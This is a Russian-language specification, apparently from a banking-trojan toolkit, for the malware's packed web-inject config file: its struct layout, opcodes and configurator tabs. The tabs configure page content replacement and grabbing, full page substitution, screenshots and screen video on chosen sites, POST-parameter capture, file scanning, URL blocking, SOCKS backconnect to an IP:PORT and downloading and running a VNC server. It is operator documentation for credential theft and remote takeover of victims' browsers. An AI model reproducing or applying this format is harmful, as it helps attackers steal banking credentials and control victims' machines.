Формат конфиг-файла
--------------------

Конфиг представляет собой массив структур следующего формата:

struct {
	ULONG	UrlLength;	// длинна сроки Url (включая заключительный 0)
	CHAR	Url[];		// ASCIIZ строка, содержащая шаблон URL с которой будет произведена операция
	ULONG	OpcodeLength;	// длинна строки Opcode (включая заключительный 0)
	CHAR	Opcode[];	// ASCIIZ строка, содержащая код операции (допустимые значения ниже)
	ULONG	VarLength;	// длинна строки Var (включая заключительный 0)
	CHAR	Var[];		// имя переменной в реестре
	ULONG	FromLength;	// длинна строки From (включая заключительный 0)
	CHAR	From[];		// ASCIIZ строка, содержащая маску начала фтрагмента
	ULONG	ToLength;	// длинна строки To (включая заключительный 0)
	CHAR	To[];		// ASCIIZ строка, содержащая маску конца фтрагмента
	ULONG	TargetLength;	// длинна строки Target (включая заключительный 0)	
	CHAR	Target[];	// ASCIIZ строка, содержащая URL для замены или шаблон для поиска	
}

Последняя структура в массиве должна быть пустой (заполнена нулями).

Примечание: пустая строка имеет размер в 1 байт и состоит из символа 0.


// Коды операции
#define	szTargetNewGrab	"NEWGRAB"
#define	szTargetScreen	"SCREENSHOT"
#define	szTargetProcess	"PROCESS"
#define	szTargetFile	"FILE"
#define	szTargetHidden	"HIDDEN"
#define	szTargetPost	"POST"
#define	szTargetVideo	"VIDEO"


формат конфига по вкладкам конфигуратора
-----------------------------------------

Вкладка Replace - замена контента

Url - задает шаблон URL страницы в содeржимом которой осуществляется замена
Opcode - задает код(текст), который будет заменен
Var - задает код (текст), на который будет замене код, указанный в Opcode


Вкладка Grab - Граббинг контента

Opcode = "NEWGRAB"
Url - задает шаблон URL страницы в содeржимом которой осуществляется поиск и копирование контента
Var - (опционально) задает имя переменной для сохранения контента
From - задает начало фрагмента для копирования
To - задает конец фрагмента для копирования


Вкладка Full Replace - подмена страницы целиком

Opcode - пустая строка
Url - задает шаблон URL страницы, которую необходмо подменить
Target - задает URL на который нужно подменить.


Вкладка Screenshot - создать снимок экрана

Opcode = "SCREENSHOT"
Url - задает шаблон URL страницы, для которой необходмо сделать снимок экрана
Target - (опционально) задает ключевое слово, при наличии которого в коде страницы будет сделан снимок экрана.


Вкладка Scan files - поиск файлов

Opcode = "FILE"
Url - задаёт маску имени файла для поиска


Вкладка Post Params - сохранение POST параметра в переменную

Opcode = "POST"
Url - задает шаблон URL при POST-запросе на который производится извлечение и сохранение параметра
From - задет имя параметра, значение которого нужно сохранить
To - задает имя переменной, в которую будет сохранено значение параметра


Вкладка Get Url - загрузить и обработать стороннюю страницу

Opcode = "PROCESS"
Url - задает шаблон URL страницы, при загрузке которой необходимо загрузить и обработать другую страницу
Target - задает URL, который необходимо загрузить и обработать


Вкладка Hidden - блокировать URL

Opcode = "HIDDEN"
Url - задаёт шаблоны URL страницы, загрузка которой должна быть заблокирована.


Вкладка Video - запись видео с экрана

Opcode = "VIDEO"
Url - задает шаблон URL страницы, для которой необходмо сделать запись видео с экрана
Target - (опционально) задает ключевое слово, при наличии которого в коде страницы будет сделана запись
Var - задаёт длительность записи в секундах


Вкладка SOCKS

Opcode = "SOCKS"
Url - задает шаблон URL страницы, для которой необходмо активировать SOCKS-сервер
Target - (опционально) задает ключевое слово, при наличии которого в коде страницы будет произведена активация
Var - задаёт адрес бэкконект сервера в формате IP:PORT


Вкладка VNC

Opcode = "VNC"
Url - задает шаблон URL страницы, для которой необходмо скачать и запустить VNC-сервер
Target - (опционально) задает ключевое слово, при наличии которого в коде страницы будет произведена активация
Var - задаёт URL (без http-префикса) к файлам VNC DLL, так же, как и в команде LOAD_DLL.


Упакованый конфиг-файл
-----------------------

Готовый конфиг упаковывается при помощи библиотеки ApLib (http://ibsensoftware.com/products_aPLib.html)
 и сохраняется в файл следующего формата:

struct {
	ULONG	UnpackedSize;	// размер оригинального файла
	CHAR	PackedData[];	// оригинальный конфиг-файл упакованый ApLib
	ULONG	PackedCRC;	// CRC32 хэш упакованных данных										// CRC32 of the packed data
}
